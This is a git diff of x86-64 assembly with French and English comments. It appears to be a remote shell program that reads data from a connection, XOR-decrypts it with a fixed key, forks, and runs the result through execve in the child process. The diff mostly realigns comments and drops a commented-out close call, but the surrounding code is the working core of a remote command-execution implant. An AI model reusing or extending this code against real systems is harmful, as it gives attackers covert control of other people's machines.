@@ -62,41 +62,41 @@ _read:
 	mov rsi, rsp			; rsi <- char *buf :
 					        ; destination (on alloue une la taille de 255 à la mémoire)
 
-	mov dl, 255			; rdx <- size_t count : on lui donne la taille du buffer
+	mov dl, 255			    ; rdx <- size_t count : on lui donne la taille du buffer
 	syscall
 
     mov rbx, rax            ; get size of what is received
 
 	cmp rax, r12            ; cmp rax to 0
-    jz _exit               ; jump in exit if receved is nothing
+    jz _exit                ; jump in exit if receved is nothing
 
-_decrypt_xor:              ; xor decrypt function
+_decrypt_xor:               ; xor decrypt function
     ; rsi = buffer
     ; rbx = size buffer
     ; rdx (dl) = xor key
-    mov dl, 0x35           ; xor_key = 5 (ascii) = 0x35
+    mov dl, 0x35            ; xor_key = 5 (ascii) = 0x35
 
     next_byte:
         xor [rsi+rbx-1], dl
         dec rbx
         jne next_byte
 
-	mov r12, rsi          ; mov fd in r12
+	mov r12, rsi            ; mov fd in r12
 
 ; ---- (57) sys_fork ----
 _fork:
 
-	mov al, 57			; sys_fork
+	mov al, 57			    ; sys_fork
 	syscall
 
     xor rbx, rbx
-	cmp rax, rbx      	; compare if in child process
-	je _execve			; jmp child process to execve
+	cmp rax, rbx      	    ; cmp rax, 0 -> compare if in child process
+	je _execve			    ; jmp child process to execve
 
     cmp rax, -1
-    je _send_error      ; if fork failed -> goto send_error
+    je _send_error          ; if fork failed -> goto send_error
 
-	jmp _read			; jmp in parent sys_connect if in parent process
+	jmp _read			    ; jmp in parent sys_connect if in parent process
 
 
 ; ----- (59) execve (const char *filename, const char *const argv[], const char *const envp[]) -----
@@ -142,10 +142,6 @@ _execve:
     syscall
 
 _exit:
-; ---- (3) sys_close (unsigned int fd) ---- close the pipe
-    ;mov al, 3
-    ;mov rdi, r15
-    ;syscall
 ; ---- (60) sys_exit (int error_code) ----
     mov       al, 60         ; system call for exit
     xor       rdi, rdi                ; exit code 0
